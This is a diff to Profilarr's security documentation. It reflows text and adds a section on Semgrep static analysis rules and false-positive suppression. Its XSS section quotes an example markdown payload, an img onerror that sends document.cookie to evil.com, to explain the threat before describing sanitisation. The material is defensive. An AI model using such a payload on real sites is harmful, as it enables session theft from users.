@@ -17,10 +17,11 @@
   - [Protected Paths](#protected-paths)
   - [Secret Stripping](#secret-stripping)
   - [XSS via Markdown / {@html}](#xss-via-markdown--html)
+  - [Static Analysis (Semgrep)](#static-analysis-semgrep)
 - [Test Coverage](#test-coverage)
   - [Unit Tests](#unit-tests-srctestsauth)
   - [Integration Tests](#integration-tests-srctestsintegrationspecs)
-  - [E2E Tests](#e2e-tests-srctestse2especsauth)
+  - [E2E Tests](#e2e-tests-srctestse2especsauth)B
   - [Infrastructure](#infrastructure)
 
 ## Overview
@@ -359,22 +360,24 @@ Secrets are stripped at two levels:
 
 ### XSS via Markdown / {@html}
 
-Svelte's `{@html}` directive renders raw HTML without escaping. Any content
-that flows through `{@html}` without sanitisation is an XSS vector.
+Svelte's `{@html}` directive renders raw HTML without escaping. Any content that
+flows through `{@html}` without sanitisation is an XSS vector.
 
 **The attack**: Profilarr clones PCD databases maintained by community
-developers. These databases contain markdown fields — quality profile
+developers. These databases contain markdown fields - quality profile
 descriptions, custom format descriptions, etc. A malicious or compromised
 developer could inject JavaScript into a description field:
 
 ```markdown
-Great profile for 1080p <!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
+Great profile for 1080p
+
+<!-- <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)"> -->
 ```
 
 Every user who clones that database would execute the payload whenever the
 description renders. The attacker could steal session cookies, exfiltrate API
-keys displayed on the page, or redirect to a phishing page — all without
-needing to authenticate.
+keys displayed on the page, or redirect to a phishing page - all without needing
+to authenticate.
 
 **Mitigation**: The `Markdown.svelte` component (the primary markdown renderer)
 passes all `marked.parse()` output through `sanitizeHtml()` from
@@ -386,10 +389,64 @@ The same `sanitizeHtml()` function is used server-side in
 `$utils/markdown/markdown.ts` for any markdown rendered in load functions.
 
 **Semgrep enforcement**: Custom rules in `.semgrep/xss.yml` flag any use of
-`marked.parse()` in Svelte files and any raw variable in `{@html}`, ensuring
-new code is reviewed for sanitisation. Because Semgrep uses regex matching for
-Svelte (no AST support), it cannot verify that sanitisation wraps the call —
+`marked.parse()` in Svelte files and any raw variable in `{@html}`, ensuring new
+code is reviewed for sanitisation. Because Semgrep uses regex matching for
+Svelte (no AST support), it cannot verify that sanitisation wraps the call -
 verified-safe instances use `nosemgrep` comments with justification.
+
+### Static Analysis (Semgrep)
+
+Semgrep runs as a blocking scan across the full codebase. The goal is zero
+findings. Any unresolved finding is either a real bug to fix or a false positive
+to suppress with a justification comment.
+
+**Running it**:
+
+```bash
+deno task semgrep        # full scan: custom rules + community rulesets
+deno task semgrep:quick  # custom rules only (faster, for iteration)
+```
+
+The full scan uses `--error` so it exits non-zero on any finding.
+
+**Community rulesets** (from Semgrep Registry):
+
+- `p/default`, `p/owasp-top-ten`, `p/security-audit` (general security)
+- `p/typescript`, `p/javascript`, `p/nodejs` (language-specific)
+- `p/csharp` (for the C# parser service)
+
+**Custom rulesets** (`.semgrep/`):
+
+| File          | What it catches                                                                   |
+| ------------- | --------------------------------------------------------------------------------- |
+| `xss.yml`     | `{@html}` without sanitisation, `marked.parse()` in Svelte, unescaped table cells |
+| `sql.yml`     | Template literal interpolation in SQL (exempts known-safe patterns)               |
+| `secrets.yml` | Sensitive field names in logger metadata                                          |
+| `deno.yml`    | Deno-specific patterns (file I/O review)                                          |
+| `csharp.yml`  | C# parser service patterns (file I/O review)                                      |
+
+**Suppressing false positives**: Use `nosemgrep` with the full rule ID and a
+justification. The comment must be on the matched line or the line immediately
+before it. Semgrep ignores comments separated by intervening lines.
+
+```ts
+// nosemgrep: profilarr.xss.table-cell-html-unescaped - all values use escapeHtml()
+html: `<div>${escapeHtml(row.name)}</div>`;
+```
+
+For Svelte templates where JS comments aren't valid, use an HTML comment on the
+same line as the `{@html}`:
+
+```svelte
+{@html parseMarkdown(text)}<!-- nosemgrep: profilarr.xss.at-html-usage -->
+```
+
+**Limitations**:
+
+- Community rules are free-tier only (no cross-file taint analysis)
+- Svelte files use generic/regex matching, not AST. Rules can't trace data flow
+  through function calls, so sanitised-but-flagged code needs `nosemgrep`
+- No dependency vulnerability scanning (Semgrep Supply Chain requires login)
 
 ## Test Coverage
 
@@ -441,5 +498,5 @@ Browser-level Playwright tests that drive the real user experience. Uses
   for isolated instances
 - **Docker Compose**: mock-oauth2-server (port 9090) + Caddy (TLS termination)
   for OIDC and proxy tests
-- **Runner**: `tests/runner.ts` — unified CLI (`deno task test`) handles unit,
+- **Runner**: `tests/runner.ts` - unified CLI (`deno task test`) handles unit,
   integration, and e2e with subcommands
